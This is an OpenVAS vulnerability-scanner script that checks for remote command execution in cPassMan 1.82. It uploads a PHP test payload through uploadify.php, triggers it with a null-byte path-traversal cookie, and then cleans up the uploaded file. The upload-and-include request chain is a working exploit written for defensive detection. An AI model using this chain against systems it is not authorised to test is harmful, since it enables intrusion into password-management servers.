###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cpassman_47379.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Collaborative Passwords Manager (cPassMan) Remote Command Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:cpassman:cpassman";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103436");
  script_version("$Revision: 13994 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-02-27 10:11:37 +0200 (Mon, 27 Feb 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Collaborative Passwords Manager (cPassMan) Remote Command Execution");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_passman_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cpassman/detected");

  script_xref(name:"URL", value:"http://code.google.com/p/cpassman/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18522/");
  script_xref(name:"URL", value:"http://cpassman.org/");

  script_tag(name:"summary", value:"cPassMan is prone to a remote command execution vulnerability because it fails to
  properly sanitize user supplied input.");

  script_tag(name:"impact", value:"Successful exploitation allows execution of arbitrary
  commands, and possibly compromise the affected application.");

  script_tag(name:"affected", value:"cPassMan 1.82 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

host = http_host_name(port:port);

vtstrings = get_vt_strings();
url = dir + "/includes/libraries/uploadify/uploadify.php";
file = vtstrings["lowercase"] + "-ul-test";
md5file = hexstr(MD5(file));

rand = rand();
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen( ex ) + 200;

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Type: multipart/form-data; boundary=---------------------------4827543632391\r\n",
             "Content-Length: ",len,"\r\n\r\n",
             "-----------------------------4827543632391\r\n",
             'Content-Disposition: form-data; name="Filedata"; filename="',file,'";',"\r\n",
             "Content-Type: text/plain\r\n",
             "\r\n",
             ex,"\r\n",
             "-----------------------------4827543632391--\r\n\r\n");
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( res =~ "^HTTP/1\.[01] 200" ) {

  req = string("GET ", dir, "/index.php HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Cookie: user_language=../../../", md5file, "%00\r\n",
               "Content-Length: 0\r\n\r\n");
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( "<title>phpinfo()" >< res && rand >< res ) {

    # clean up...
    ex = "";
    len = strlen( ex ) + 200;

    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: multipart/form-data; boundary=---------------------------4827543632391\r\n",
                 "Content-Length: ",len,"\r\n\r\n",
                 "-----------------------------4827543632391\r\n",
                 'Content-Disposition: form-data; name="Filedata"; filename="',file,'";',"\r\n",
                 "Content-Type: text/plain\r\n",
                 "\r\n",
                 ex,"\r\n",
                 "-----------------------------4827543632391--\r\n\r\n");
    http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
  exit( 99 );
}

exit( 0 );